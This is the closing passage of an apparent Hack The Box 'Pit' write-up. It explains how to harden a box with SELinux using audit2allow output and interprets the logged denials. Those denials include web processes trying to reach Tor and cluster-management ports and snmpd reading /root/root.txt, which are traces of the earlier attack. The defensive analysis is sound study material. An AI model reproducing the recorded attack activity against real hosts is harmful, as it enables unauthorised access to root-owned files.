</span></span><span style=display:flex><span>allow httpd_t tor_port_t:tcp_socket name_connect;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#============= snmpd_t ==============</span>
</span></span><span style=display:flex><span>allow snmpd_t admin_home_t:file <span style=color:#ff79c6>{</span> getattr open <span style=color:#8be9fd;font-style:italic>read</span> <span style=color:#ff79c6>}</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#============= user_t ==============</span>
</span></span><span style=display:flex><span>allow user_t init_var_run_t:service status;
</span></span><span style=display:flex><span>allow user_t pam_var_run_t:dir write;
</span></span><span style=display:flex><span>allow user_t self:capability sys_resource;
</span></span><span style=display:flex><span>allow user_t tuned_t:dbus send_msg;
</span></span></code></pre></td></tr></table></div></div><p>It is very useful for hardening because we can:</p><ol><li>set the box to permissive mode</li><li>create a baseline of legit activity by performing only legit activity (assume no forbidden activity is done )</li><li>add the rules with <code>audit2allow -i /var/log/audit/audit.log</code></li><li>set the box to enforcing mode</li></ol><p>On the above example, forbidden activities detected are:</p><ul><li>nginx or php trying to target <code>http_port_t</code> to connect a socket</li><li>nginx or php trying to target <code>ricci_port_t</code> (cluster management) to connect a socket</li><li>nginx or php trying to target <code>tor_port_t</code> to conect a socket</li><li>snmpd trying to read file having extended attribute <code>admin_home</code> (cat /root/root.txt)</li><li>user_t is being denied several resources (e.g service, pam, dbus &mldr; ) which I am not familiar with</li></ul><h2 id=explore-selinux-configuration>Explore SELinux configuration</h2><p>[root@pit ~]# cat /etc/selinux/config</p><pre tabindex=0><code># This file controls the state of SELinux on the system.
# SELINUX= can take one of these three values:
# enforcing - SELinux security policy is enforced.
# permissive - SELinux prints warnings instead of enforcing.
# disabled - No SELinux policy is loaded.
SELINUX=enforcing

# SELINUXTYPE= can take one of these three values:
# targeted - Targeted processes are protected,
# minimum - Modification of targeted policy. Only selected processes are protected.
# mls - Multi Level Security protection.

SELINUXTYPE=targeted
</code></pre></div></article><hr><div class=sharing-buttons><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=HTB%20-%20Pit&caption=HTB%20-%20Pit&canonicalUrl=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f" target=_blank rel=noopener aria-label title="Share on tumblr"><div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg></div></div></a><a class=resp-sharing-button__link href="mailto:?subject=HTB%20-%20Pit&body=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f" target=_self rel=noopener aria-label title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div></div></a><a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f&media=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f;description=HTB%20-%20Pit" target=_blank rel=noopener aria-label title="Share on pinterest"><div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f&title=HTB%20-%20Pit&summary=HTB%20-%20Pit&source=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f" target=_blank rel=noopener aria-label title="Share on linkedin"><div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f&resubmit=true&title=HTB%20-%20Pit" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f;title=HTB%20-%20Pit" target=_blank rel=noopener aria-label title="Share on xing"><div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg></div></div></a><a class=resp-sharing-button__link href="whatsapp://send?text=HTB%20-%20Pit%20https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f" target=_blank rel=noopener aria-label title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f&t=HTB%20-%20Pit" target=_blank rel=noopener aria-label title="Share on hacker news"><div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://telegram.me/share/url?text=HTB%20-%20Pit&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-pit%2f" target=_blank rel=noopener aria-label title="Share on telegram"><div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></div></div></a></div><hr><div class=pagination><div class=pagination__title><span class=pagination__title-h></span></div><div class=pagination__buttons><a href=https://0xade1.github.io/posts/2021/09/social-media-dont-care-for-your-privacy/ class="button previous"><span class=button__icon>â†</span>
<span class=button__text>Social Media Dont Care for Your Privacy</span></a>
<a href=https://0xade1.github.io/posts/2021/10/htb-jarmis/ class="button next"><span class=button__text>HTB - Jarmis</span>
<span class=button__icon>â†’</span></a></div></div><hr></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2023</span>
<span><a href=https://0xade1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>Made with &#10084;</span></div></div></footer></div><script type=text/javascript src=https://0xade1.github.io/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5+q9hMmUsWWGa7+YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE+kyEg=="></script><div id=fastSearch><input id=searchInput tabindex=0><ul id=searchResults></ul></div><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script>
<script src=https://0xade1.github.io/js/fastsearch.js></script></body></html>